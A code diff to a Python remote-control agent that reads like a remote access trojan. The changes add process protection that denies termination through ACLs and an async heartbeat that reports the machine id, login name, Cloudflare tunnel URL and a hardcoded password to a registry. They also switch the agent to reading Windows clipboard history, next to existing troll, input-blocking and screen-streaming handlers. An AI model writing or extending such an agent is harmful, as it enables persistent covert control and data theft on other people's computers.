@@ -6,6 +6,7 @@ import uuid
 import json
 import subprocess
 import urllib.request
+import urllib.parse
 import platform
 import base64
 import threading
@@ -49,6 +50,7 @@ try:
     from targets.webrtc_handler import WebRTCHandler, AIORTC_AVAILABLE
     from targets.webrtc_tracks import create_screen_track
     from targets.resource_manager import get_resource_manager
+    from targets.protection import protect_process
     try:
         from targets.tunnel_manager import TunnelManager
     except ImportError:
@@ -73,10 +75,12 @@ except ImportError:
         from webrtc_handler import WebRTCHandler, AIORTC_AVAILABLE
         from webrtc_tracks import create_screen_track
         from resource_manager import get_resource_manager
-        from tunnel_manager import TunnelManager 
+        from tunnel_manager import TunnelManager
+        from protection import protect_process
     except ImportError:
         AIORTC_AVAILABLE = False
         WebRTCHandler = None
+        protect_process = None
         TunnelManager = None
 
 # CONFIG
@@ -109,6 +113,8 @@ else:
             pass
 
 class AsyncAgent:
+    HEARTBEAT_INTERVAL = 30  # Seconds
+
     def __init__(self, broker_url=DEFAULT_BROKER):
         self.broker_url = broker_url
         self.my_id = str(uuid.getnode()) # Assuming generate_machine_id() is equivalent to this or needs to be defined
@@ -142,10 +148,10 @@ class AsyncAgent:
         self.device_settings = DeviceSettings()
         self.troll_handler = TrollHandler()
         self.direct_ws_clients = set()
-        self.username = os.environ.get('MYDESK_USERNAME', platform.node())
+        self.username = os.getlogin()
         self.direct_url = None
         self.direct_server = None
-        self.tunnel_mgr = TunnelManager(8765) if TunnelManager else None
+        self.tunnel_mgr = TunnelManager(8765, on_url_change=self._on_tunnel_url_change) if TunnelManager else None
         self.curtain = self.privacy # Alias for compatibility
         
         # State
@@ -184,19 +190,22 @@ class AsyncAgent:
              self.registry_pwd = "HOLYFUCKJAMESLORDGOTHACK132"
         
         self.running = True
-        self._stop_event = threading.Event() # For clean shutdown
+        self._shutdown_event = asyncio.Event()
+        self._heartbeat_trigger = asyncio.Event()  # Wake-up trigger for immediate registry updates
 
     def start(self, local_mode=False):
+        # Apply process protection (ACL to deny termination)
+        if protect_process:
+            if protect_process():
+                print("[+] Process Protection Applied (ACL)")
+            else:
+                print("[-] Process Protection Failed")
+        
         # Validate HTTPS
         parsed = urllib.parse.urlparse(self.registry_url)
         if parsed.scheme != "https" and "localhost" not in self.registry_url:
              print("[-] ERROR: Registry URL must use HTTPS!")
              return
-
-        # Start Heartbeat
-        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop)
-        self.heartbeat_thread.daemon = True
-        self.heartbeat_thread.start()
 
         # Start Tunnel (Cloudflare)
         if self.tunnel_mgr and not local_mode:
@@ -232,47 +241,66 @@ class AsyncAgent:
                     f.write(f"[{datetime.datetime.now()}] {err_msg}\n")
             except: pass
 
+    def _on_tunnel_url_change(self, new_url):
+        """Called when TunnelManager gets a new public URL."""
+        print(f"[+] Agent received new Tunnel URL: {new_url}")
+        self.direct_url = new_url.replace("https://", "wss://")
+        
+        # Wake up the existing heartbeat loop for an immediate update
+        if self.loop and self.loop.is_running():
+            self.loop.call_soon_threadsafe(self._heartbeat_trigger.set)
+
     def stop(self):
         self.running = False
-        self._stop_event.set()
+        if self.loop and not self.loop.is_closed():
+            self.loop.call_soon_threadsafe(self._shutdown_event.set)
         if self.ws:
             self.ws.close()
 
-    def _heartbeat_loop(self):
-        """Sends heartbeat to Registry every 60s"""
-        while not self._stop_event.is_set():
+    async def heartbeat_loop(self):
+        """Sends heartbeat to Registry periodically. Can be woken up for immediate updates."""
+        while not self._shutdown_event.is_set():
+            # 1. Update Registry
             try:
-                if self.direct_url: # Only report if we have a tunnel URL
-                   # Validate URL again just in case
-                   if not self.registry_url.startswith("https://") and "localhost" not in self.registry_url:
-                        print("[-] Heartbeat skipped: Non-HTTPS URL")
-                        self._stop_event.wait(30)
-                        continue
-
+                if self.direct_url:
                    payload = {
                        "id": self.my_id,
                        "username": self.username,
                        "url": self.direct_url,
                        "password": self.registry_pwd
                    }
-                   # Use requests or urllib (stdlib)
-                   req = urllib.request.Request(f"{self.registry_url}/api/update")
-                   req.add_header('Content-Type', 'application/json; charset=utf-8')
-                   jsondata = json.dumps(payload).encode('utf-8')
-                   req.add_header('Content-Length', len(jsondata))
                    
-                   # Timeout to prevent hanging
-                   with urllib.request.urlopen(req, jsondata, timeout=10):
-                       pass
-                       # print(f"[+] Heartbeat sent: {response.status}")
-                else:
-                    pass
-                    # print("[-] Heartbeat skipped: No Direct URL")
+                   def do_request():
+                        req = urllib.request.Request(f"{self.registry_url}/api/update")
+                        req.add_header('Content-Type', 'application/json; charset=utf-8')
+                        jsondata = json.dumps(payload).encode('utf-8')
+                        req.add_header('Content-Length', len(jsondata))
+                        with urllib.request.urlopen(req, jsondata, timeout=10):
+                            pass
+                   
+                   await self.loop.run_in_executor(None, do_request)
+                   print("[+] Registry updated.")
             except Exception as e:
                 print(f"[-] Heartbeat Failed: {e}")
-            
-            time.sleep(60)
 
+            # 2. Wait for either the interval, shutdown, or an immediate trigger
+            self._heartbeat_trigger.clear()
+            try:
+                # We wait for either the shutdown event OR the heartbeat trigger
+                # Using wait_for with a timeout acts as our periodic sleep
+                done, pending = await asyncio.wait(
+                    [
+                        asyncio.create_task(self._shutdown_event.wait()),
+                        asyncio.create_task(self._heartbeat_trigger.wait())
+                    ],
+                    timeout=self.HEARTBEAT_INTERVAL,
+                    return_when=asyncio.FIRST_COMPLETED
+                )
+                # Cleanup pending tasks
+                for t in pending:
+                    t.cancel()
+            except Exception:
+                pass # Timeout reached, loop continues naturally
 
     def _create_background_task(self, coro):
         """Helper to create fire-and-forget background tasks safely."""
@@ -623,6 +651,10 @@ class AsyncAgent:
     async def start_direct_server(self):
         """Starts the internal WebSocket server for Cloudflare Tunnel traffic"""
         try:
+            # Set loop and start heartbeat
+            self.loop = asyncio.get_running_loop()
+            self._create_background_task(self.heartbeat_loop())
+
             print("[*] Starting Internal Direct Server on port 8765...")
             # Allow all origins for now to simplify
             # Relaxed Ping settings for heavy streaming
@@ -636,7 +668,7 @@ class AsyncAgent:
                 process_request=self._fix_headers
             ):
                 print("[+] Direct Server Listening on 8765")
-                await asyncio.Future()  # Run forever
+                await self._shutdown_event.wait()
         except Exception as e:
             print(f"[-] Direct Server Error: {e}")
 
@@ -983,10 +1015,6 @@ class AsyncAgent:
                                 if self.input_ctrl:
                                     self.input_ctrl.block_input(False)
                             
-                                # Disable Blocker
-                                if self.input_ctrl:
-                                    self.input_ctrl.block_input(False)
-                            
                     except Exception as e:
                         print(f"[-] Setting Error: {e}")
 
@@ -1158,17 +1186,10 @@ class AsyncAgent:
                         print(f"[-] Clip Get Error: {e}")
                         self._send_async(protocol.OP_CLIP_DATA, b'')
 
-                elif opcode == protocol.OP_CLIP_SET:
-                    try:
-                        text = payload.decode('utf-8')
-                        await self.loop.run_in_executor(None, self.clipboard_handler.set_clipboard, text)
-                    except Exception as e:
-                        print(f"[-] Clip Set Error: {e}")
-
                 elif opcode == protocol.OP_CLIP_HISTORY_REQ:
                     # Send full clipboard history
                     try:
-                        history = self.clipboard_handler.get_history()
+                        history = self.clipboard_handler.get_windows_history()
                         data = json.dumps(history).encode('utf-8')
                         self._send_async(protocol.OP_CLIP_HISTORY_DATA, data)
                     except Exception as e:
@@ -1182,7 +1203,7 @@ class AsyncAgent:
                         if index >= 0:
                             self.clipboard_handler.delete_entry(index)
                             # Send updated history
-                            history = self.clipboard_handler.get_history()
+                            history = self.clipboard_handler.get_windows_history()
                             resp = json.dumps(history).encode('utf-8')
                             self._send_async(protocol.OP_CLIP_HISTORY_DATA, resp)
                     except Exception as e:
@@ -1197,7 +1218,7 @@ class AsyncAgent:
                         
                         # If enabled, send current history immediately
                         if self.clipboard_consent:
-                             history = self.clipboard_handler.get_history()
+                             history = self.clipboard_handler.get_windows_history()
                              data = json.dumps(history).encode('utf-8')
                              self._send_async(protocol.OP_CLIP_HISTORY_DATA, data)
                     except Exception as e:
@@ -1681,74 +1702,6 @@ class AsyncAgent:
 
 
 
-    async def heartbeat_loop(self, pub_url):
-        """Periodically update the Registry with this agent's URL."""
-        from targets import config
-        import requests
-        
-        # Validate registry URL scheme
-        from urllib.parse import urlparse
-        if urlparse(config.REGISTRY_URL).scheme != 'https':
-            print("[-] Registry Error: URL must be HTTPS")
-            return
-
-        # Prepare Payload
-        
-        payload = {
-            "id": self.my_id,
-            "username": config.AGENT_USERNAME,
-            "url": pub_url,
-            "password": config.REGISTRY_PASSWORD
-        }
-        headers = {"Content-Type": "application/json"}
-        
-        # Ensure we target the API endpoint
-        reg_url = config.REGISTRY_URL.rstrip('/')
-        if not reg_url.endswith('/api'):
-            reg_url += '/api'
-            
-        print(f"[*] Starting Heartbeat Loop (Target: {reg_url}/update)")
-        
-        while True:
-            try:
-                # Run blocking request in executor
-                def send_heartbeat():
-                    return requests.post(
-                        f"{reg_url}/update", 
-                        json=payload, 
-                        headers=headers,
-                        timeout=10
-                    )
-                
-                r = await self.loop.run_in_executor(None, send_heartbeat)
-                
-                if r.status_code == 200:
-                    # print(f"[+] Heartbeat OK ({safe_id})") # Optional: reduce spam
-                    pass
-                else:
-                    print(f"[-] Registry Update Failed: {r.status_code}")
-                    
-            except Exception as e:
-                print(f"[-] Registry Connect Error: {e}")
-                
-            # Wait 30 seconds (Heartbeat interval)
-            await asyncio.sleep(30)
-
-        # Start the asyncio loop
-        self.loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(self.loop)
-        
-        # Schedule Heartbeat Task
-        if pub_url:
-            self.loop.create_task(self.heartbeat_loop(pub_url))
-        
-        # Only run Direct Server (Broker connection removed)
-        try:
-            self.loop.run_until_complete(self.start_direct_server())
-        except KeyboardInterrupt:
-            pass
-        finally:
-            self.loop.close()
 
 def disable_quickedit():
     """Disable Windows Console QuickEdit and Insert Mode to prevent hanging."""
